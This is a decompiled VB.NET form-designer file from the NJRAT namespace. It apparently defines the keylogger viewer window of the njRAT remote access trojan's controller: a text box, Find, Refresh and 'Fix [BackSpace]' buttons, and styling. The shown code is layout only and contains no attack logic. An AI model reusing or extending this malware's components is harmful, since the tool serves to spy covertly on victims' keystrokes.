Namespace NJRAT
	' Token: 0x02000011 RID: 17
	<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
	Public Partial Class kl
		Inherits Global.System.Windows.Forms.Form

		' Token: 0x060002A8 RID: 680 RVA: 0x0001A42C File Offset: 0x0001862C
		<Global.System.Diagnostics.DebuggerNonUserCode()>
		Protected Overrides Sub Dispose(disposing As Boolean)
			Try
				If disposing AndAlso Me.components IsNot Nothing Then
					Me.components.Dispose()
				End If
			Finally
				MyBase.Dispose(disposing)
			End Try
		End Sub

		' Token: 0x060002A9 RID: 681 RVA: 0x0001A46C File Offset: 0x0001866C
		<Global.System.Diagnostics.DebuggerStepThrough()>
		Private Sub InitializeComponent()
			Me.components = New Global.System.ComponentModel.Container()
			Dim componentResourceManager As Global.System.ComponentModel.ComponentResourceManager = New Global.System.ComponentModel.ComponentResourceManager(GetType(Global.NJRAT.kl))
			Me.ProgressBar1 = New Global.System.Windows.Forms.ProgressBar()
			Me.ContextMenuStrip1 = New Global.System.Windows.Forms.ContextMenuStrip(Me.components)
			Me.CopyToolStripMenuItem = New Global.System.Windows.Forms.ToolStripMenuItem()
			Me.SelectAllToolStripMenuItem = New Global.System.Windows.Forms.ToolStripMenuItem()
			Me.FormSkin1 = New Global.NJRAT.FormSkin()
			Me.UserImage1 = New Global.NJRAT.UserImage()
			Me.FlatMini2 = New Global.NJRAT.FlatMini()
			Me.FlatButton4 = New Global.NJRAT.FlatButton()
			Me.PictureBox4 = New Global.System.Windows.Forms.PictureBox()
			Me.FlatButton3 = New Global.NJRAT.FlatButton()
			Me.FlatButton1 = New Global.NJRAT.FlatButton()
			Me.FlatButton2 = New Global.NJRAT.FlatButton()
			Me.T1 = New Global.System.Windows.Forms.RichTextBox()
			Me.ContextMenuStrip1.SuspendLayout()
			Me.FormSkin1.SuspendLayout()
			CType(Me.PictureBox4, Global.System.ComponentModel.ISupportInitialize).BeginInit()
			Me.SuspendLayout()
			Dim progressBar As Global.System.Windows.Forms.Control = Me.ProgressBar1
			Dim location As Global.System.Drawing.Point = New Global.System.Drawing.Point(111, 315)
			progressBar.Location = location
			Dim progressBar2 As Global.System.Windows.Forms.Control = Me.ProgressBar1
			Dim margin As Global.System.Windows.Forms.Padding = New Global.System.Windows.Forms.Padding(3, 4, 3, 4)
			progressBar2.Margin = margin
			Me.ProgressBar1.Name = "ProgressBar1"
			Dim progressBar3 As Global.System.Windows.Forms.Control = Me.ProgressBar1
			Dim size As Global.System.Drawing.Size = New Global.System.Drawing.Size(296, 28)
			progressBar3.Size = size
			Me.ProgressBar1.TabIndex = 0
			Me.ContextMenuStrip1.Items.AddRange(New Global.System.Windows.Forms.ToolStripItem() { Me.CopyToolStripMenuItem, Me.SelectAllToolStripMenuItem })
			Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
			Dim contextMenuStrip As Global.System.Windows.Forms.Control = Me.ContextMenuStrip1
			size = New Global.System.Drawing.Size(141, 52)
			contextMenuStrip.Size = size
			Me.CopyToolStripMenuItem.Name = "CopyToolStripMenuItem"
			Dim copyToolStripMenuItem As Global.System.Windows.Forms.ToolStripItem = Me.CopyToolStripMenuItem
			size = New Global.System.Drawing.Size(140, 24)
			copyToolStripMenuItem.Size = size
			Me.CopyToolStripMenuItem.Text = "Copy"
			Me.SelectAllToolStripMenuItem.Name = "SelectAllToolStripMenuItem"
			Dim selectAllToolStripMenuItem As Global.System.Windows.Forms.ToolStripItem = Me.SelectAllToolStripMenuItem
			size = New Global.System.Drawing.Size(140, 24)
			selectAllToolStripMenuItem.Size = size
			Me.SelectAllToolStripMenuItem.Text = "Select All"
			Me.FormSkin1.BackColor = Global.System.Drawing.Color.White
			Me.FormSkin1.BaseColor = Global.System.Drawing.Color.FromArgb(34, 33, 51)
			Me.FormSkin1.BorderColor = Global.System.Drawing.Color.FromArgb(105, 93, 235)
			Me.FormSkin1.BorderSize = 10
			Me.FormSkin1.Controls.Add(Me.UserImage1)
			Me.FormSkin1.Controls.Add(Me.FlatMini2)
			Me.FormSkin1.Controls.Add(Me.FlatButton4)
			Me.FormSkin1.Controls.Add(Me.PictureBox4)
			Me.FormSkin1.Controls.Add(Me.FlatButton3)
			Me.FormSkin1.Controls.Add(Me.FlatButton1)
			Me.FormSkin1.Controls.Add(Me.FlatButton2)
			Me.FormSkin1.Controls.Add(Me.T1)
			Me.FormSkin1.Dock = Global.System.Windows.Forms.DockStyle.Fill
			Me.FormSkin1.FlatColor = Global.System.Drawing.Color.FromArgb(35, 168, 109)
			Me.FormSkin1.Font = New Global.System.Drawing.Font("Segoe UI", 12F)
			Me.FormSkin1.HeaderColor = Global.System.Drawing.Color.FromArgb(50, 50, 50)
			Me.FormSkin1.HeaderMaximize = False
			Dim formSkin As Global.System.Windows.Forms.Control = Me.FormSkin1
			location = New Global.System.Drawing.Point(0, 0)
			formSkin.Location = location
			Me.FormSkin1.Name = "FormSkin1"
			Dim formSkin2 As Global.System.Windows.Forms.Control = Me.FormSkin1
			size = New Global.System.Drawing.Size(712, 475)
			formSkin2.Size = size
			Me.FormSkin1.TabIndex = 1
			Me.FormSkin1.Text = "kl"
			Me.UserImage1.BackColor = Global.System.Drawing.Color.Transparent
			Me.UserImage1.BorderSize = 2
			Me.UserImage1.ColorActivityStatus = Global.System.Drawing.Color.FromArgb(105, 93, 235)
			Me.UserImage1.ColorBorder = Global.System.Drawing.Color.FromArgb(190, 190, 190)
			Me.UserImage1.ColorProgress = Global.System.Drawing.Color.FromArgb(105, 93, 235)
			Me.UserImage1.EnableHover = False
			Dim userImage As Global.System.Windows.Forms.Control = Me.UserImage1
			location = New Global.System.Drawing.Point(23, 75)
			userImage.Location = location
			Me.UserImage1.Maximum = 100
			Me.UserImage1.Name = "UserImage1"
			Me.UserImage1.RotationAngle = 310
			Me.UserImage1.ShowActivityStatus = True
			Me.UserImage1.ShowBorder = False
			Me.UserImage1.ShowImage = True
			Me.UserImage1.ShowProgress = True
			Dim userImage2 As Global.System.Windows.Forms.Control = Me.UserImage1
			size = New Global.System.Drawing.Size(125, 125)
			userImage2.Size = size
			Me.UserImage1.StartingAngle = 70
			Me.UserImage1.TabIndex = 79
			Me.UserImage1.Text = "UserImage1"
			Me.UserImage1.UImage = CType(componentResourceManager.GetObject("UserImage1.UImage"), Global.System.Drawing.Image)
			Me.UserImage1.Value = 50
			Me.FlatMini2.Anchor = (Global.System.Windows.Forms.AnchorStyles.Top Or Global.System.Windows.Forms.AnchorStyles.Right)
			Me.FlatMini2.BackColor = Global.System.Drawing.Color.White
			Me.FlatMini2.BaseColor = Global.System.Drawing.Color.FromArgb(33, 33, 50)
			Me.FlatMini2.Font = New Global.System.Drawing.Font("Marlett", 12F)
			Dim flatMini As Global.System.Windows.Forms.Control = Me.FlatMini2
			location = New Global.System.Drawing.Point(682, 12)
			flatMini.Location = location
			Me.FlatMini2.Name = "FlatMini2"
			Dim flatMini2 As Global.System.Windows.Forms.Control = Me.FlatMini2
			size = New Global.System.Drawing.Size(18, 18)
			flatMini2.Size = size
			Me.FlatMini2.TabIndex = 78
			Me.FlatMini2.Text = "FlatMini2"
			Me.FlatMini2.TextColor = Global.System.Drawing.Color.FromArgb(105, 93, 235)
			Me.FlatButton4.BackColor = Global.System.Drawing.Color.Transparent
			Me.FlatButton4.BaseColor = Global.System.Drawing.Color.FromArgb(34, 33, 51)
			Me.FlatButton4.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.FlatButton4.Font = New Global.System.Drawing.Font("Segoe UI", 10.8F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Dim flatButton As Global.System.Windows.Forms.Control = Me.FlatButton4
			location = New Global.System.Drawing.Point(71, 416)
			flatButton.Location = location
			Me.FlatButton4.Name = "FlatButton4"
			Me.FlatButton4.Rounded = False
			Dim flatButton2 As Global.System.Windows.Forms.Control = Me.FlatButton4
			size = New Global.System.Drawing.Size(88, 47)
			flatButton2.Size = size
			Me.FlatButton4.TabIndex = 77
			Me.FlatButton4.Text = "Exit"
			Me.FlatButton4.TextColor = Global.System.Drawing.Color.FromArgb(105, 93, 235)
			Me.PictureBox4.BackColor = Global.System.Drawing.Color.Transparent
			Me.PictureBox4.Image = CType(componentResourceManager.GetObject("PictureBox4.Image"), Global.System.Drawing.Image)
			Dim pictureBox As Global.System.Windows.Forms.Control = Me.PictureBox4
			location = New Global.System.Drawing.Point(13, 416)
			pictureBox.Location = location
			Me.PictureBox4.Name = "PictureBox4"
			Dim pictureBox2 As Global.System.Windows.Forms.Control = Me.PictureBox4
			size = New Global.System.Drawing.Size(52, 47)
			pictureBox2.Size = size
			Me.PictureBox4.TabIndex = 76
			Me.PictureBox4.TabStop = False
			Me.FlatButton3.BackColor = Global.System.Drawing.Color.Transparent
			Me.FlatButton3.BaseColor = Global.System.Drawing.Color.FromArgb(34, 33, 51)
			Me.FlatButton3.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.FlatButton3.Font = New Global.System.Drawing.Font("Segoe UI", 10.8F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Dim flatButton3 As Global.System.Windows.Forms.Control = Me.FlatButton3
			location = New Global.System.Drawing.Point(542, 33)
			flatButton3.Location = location
			Me.FlatButton3.Name = "FlatButton3"
			Me.FlatButton3.Rounded = False
			Dim flatButton4 As Global.System.Windows.Forms.Control = Me.FlatButton3
			size = New Global.System.Drawing.Size(147, 35)
			flatButton4.Size = size
			Me.FlatButton3.TabIndex = 75
			Me.FlatButton3.Text = "Fix [BackSpace]"
			Me.FlatButton3.TextColor = Global.System.Drawing.Color.FromArgb(105, 93, 235)
			Me.FlatButton1.BackColor = Global.System.Drawing.Color.Transparent
			Me.FlatButton1.BaseColor = Global.System.Drawing.Color.FromArgb(34, 33, 51)
			Me.FlatButton1.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.FlatButton1.Font = New Global.System.Drawing.Font("Segoe UI", 10.8F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Dim flatButton5 As Global.System.Windows.Forms.Control = Me.FlatButton1
			location = New Global.System.Drawing.Point(277, 33)
			flatButton5.Location = location
			Me.FlatButton1.Name = "FlatButton1"
			Me.FlatButton1.Rounded = False
			Dim flatButton6 As Global.System.Windows.Forms.Control = Me.FlatButton1
			size = New Global.System.Drawing.Size(95, 35)
			flatButton6.Size = size
			Me.FlatButton1.TabIndex = 74
			Me.FlatButton1.Text = "Find"
			Me.FlatButton1.TextColor = Global.System.Drawing.Color.FromArgb(105, 93, 235)
			Me.FlatButton2.BackColor = Global.System.Drawing.Color.Transparent
			Me.FlatButton2.BaseColor = Global.System.Drawing.Color.FromArgb(34, 33, 51)
			Me.FlatButton2.Cursor = Global.System.Windows.Forms.Cursors.Hand
			Me.FlatButton2.Font = New Global.System.Drawing.Font("Segoe UI", 10.8F, Global.System.Drawing.FontStyle.Bold, Global.System.Drawing.GraphicsUnit.Point, 0)
			Dim flatButton7 As Global.System.Windows.Forms.Control = Me.FlatButton2
			location = New Global.System.Drawing.Point(165, 33)
			flatButton7.Location = location
			Me.FlatButton2.Name = "FlatButton2"
			Me.FlatButton2.Rounded = False
			Dim flatButton8 As Global.System.Windows.Forms.Control = Me.FlatButton2
			size = New Global.System.Drawing.Size(95, 35)
			flatButton8.Size = size
			Me.FlatButton2.TabIndex = 73
			Me.FlatButton2.Text = "Refresh"
			Me.FlatButton2.TextColor = Global.System.Drawing.Color.FromArgb(105, 93, 235)
			Me.T1.BackColor = Global.System.Drawing.Color.FromArgb(34, 33, 51)
			Me.T1.ContextMenuStrip = Me.ContextMenuStrip1
			Me.T1.Font = New Global.System.Drawing.Font("Segoe UI", 7.8F, Global.System.Drawing.FontStyle.Regular, Global.System.Drawing.GraphicsUnit.Point, 0)
			Me.T1.ForeColor = Global.System.Drawing.Color.FromArgb(105, 93, 235)
			Dim t As Global.System.Windows.Forms.Control = Me.T1
			location = New Global.System.Drawing.Point(165, 75)
			t.Location = location
			Dim t2 As Global.System.Windows.Forms.Control = Me.T1
			margin = New Global.System.Windows.Forms.Padding(3, 4, 3, 4)
			t2.Margin = margin
			Me.T1.Name = "T1"
			Dim t3 As Global.System.Windows.Forms.Control = Me.T1
			size = New Global.System.Drawing.Size(537, 390)
			t3.Size = size
			Me.T1.TabIndex = 4
			Me.T1.Text = ""
			Dim autoScaleDimensions As Global.System.Drawing.SizeF = New Global.System.Drawing.SizeF(7F, 16F)
			Me.AutoScaleDimensions = autoScaleDimensions
			Me.AutoScaleMode = Global.System.Windows.Forms.AutoScaleMode.Font
			size = New Global.System.Drawing.Size(712, 475)
			Me.ClientSize = size
			Me.Controls.Add(Me.FormSkin1)
			Me.Controls.Add(Me.ProgressBar1)
			Me.FormBorderStyle = Global.System.Windows.Forms.FormBorderStyle.None
			margin = New Global.System.Windows.Forms.Padding(3, 4, 3, 4)
			Me.Margin = margin
			Me.Name = "kl"
			Me.ShowIcon = False
			Me.StartPosition = Global.System.Windows.Forms.FormStartPosition.CenterScreen
			Me.Text = "kl"
			Me.TransparencyKey = Global.System.Drawing.Color.Fuchsia
			Me.ContextMenuStrip1.ResumeLayout(False)
			Me.FormSkin1.ResumeLayout(False)
			CType(Me.PictureBox4, Global.System.ComponentModel.ISupportInitialize).EndInit()
			Me.ResumeLayout(False)
		End Sub

		' Token: 0x0400012A RID: 298
		Private components As Global.System.ComponentModel.IContainer
	End Class
End Namespace
